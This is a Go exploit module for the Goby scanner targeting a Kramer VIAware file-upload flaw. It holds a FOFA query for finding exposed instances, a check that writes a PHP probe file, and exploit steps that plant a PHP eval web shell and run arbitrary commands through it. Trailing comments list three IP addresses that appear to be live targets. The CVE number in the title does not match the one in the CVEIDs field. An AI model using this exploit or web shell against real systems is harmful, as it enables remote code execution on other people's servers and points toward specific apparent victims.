package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "VIAware writeBrowseFilePathAjax File Upload (CVE-2021-35064)",
    "Description": "<p>Kramer Electronics VIAware is a set of wireless presentation collaboration software solutions from Kramer Electronics, Israel.</p><p>A code issue vulnerability exists in Kramer Electronics VIAware that allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames (even though browseSystemFiles.php is no longer GUI accessible).</p>",
    "Product": "VIAware",
    "Homepage": "https://www.kramerav.com/cn/product/viaware",
    "DisclosureDate": "2022-04-30",
    "Author": "abszse",
    "FofaQuery": "body=\"Kramer\" && title=\"VIA\"",
    "GobyQuery": "body=\"Kramer\" && title=\"VIA\"",
    "Level": "3",
    "Impact": "<p>A code issue vulnerability exists in Kramer Electronics VIAware that allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames (even though browseSystemFiles.php is no longer GUI accessible).</p>",
    "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or the reference website for solutions: <a href=\"https://www.kramerav.com/cn/product/viaware\">https://www.kramerav.com/cn/product/viaware</a></p>",
    "References": [
        "https://write-up.github.io/kramerav/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "system('id');",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ajaxPages/writeBrowseFilePathAjax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "radioBtnVal=%3C%3Fphp%0Aecho%0Amd5(1433);unlink(__FILE__);%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2Ftest1234.php"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/test1234.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "b069b3415151fa7217e870017374de7c",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ajaxPages/writeBrowseFilePathAjax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "radioBtnVal=<?php%20@eval($_POST['a']);?>&associateFileName=%2Fvar%2Fwww%2Fhtml%2Ftest1234.php"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/test1234.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "a={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2021-36356"
    ],
    "CNNVD": [
        "CNNVD-202108-2758"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "VIAware writeBrowseFilePathAjax 任意文件上传漏洞（CVE-2021-35064）",
            "Product": "VIAware",
            "Description": "<p>Kramer Electronics VIAware是以色列克莱默电子（Kramer Electronics）公司的一套无线演示协作软件解决方案。<br></p><p>Kramer Electronics VIAware 存在代码问题漏洞，该漏洞源于 KRAMER VIAware 允许远程攻击者执行任意代码，因为 ajaxPages/writeBrowseFilePathAjax.php 接受任意可执行路径名（即使 browseSystemFiles.php 不再可通过 GUI 访问）。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://www.kramerav.com/cn/product/viaware\">https://www.kramerav.com/cn/product/viaware</a><br></p>",
            "Impact": "<p>Kramer Electronics VIAware 存在代码问题漏洞，该漏洞源于 KRAMER VIAware 允许远程攻击者执行任意代码，因为 ajaxPages/writeBrowseFilePathAjax.php 接受任意可执行路径名（即使 browseSystemFiles.php 不再可通过 GUI 访问）。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "VIAware writeBrowseFilePathAjax File Upload (CVE-2021-35064)",
            "Product": "VIAware",
            "Description": "<p>Kramer Electronics VIAware is a set of wireless presentation collaboration software solutions from Kramer Electronics, Israel.<br></p><p>A code issue vulnerability exists in Kramer Electronics VIAware that allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames (even though browseSystemFiles.php is no longer GUI accessible).<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or the reference website for solutions: <a href=\"https://www.kramerav.com/cn/product/viaware\">https://www.kramerav.com/cn/product/viaware</a><br></p>",
            "Impact": "<p>A code issue vulnerability exists in Kramer Electronics VIAware that allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames (even though browseSystemFiles.php is no longer GUI accessible).<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//http://157.253.34.225
//http://152.19.158.64
//http://130.89.192.103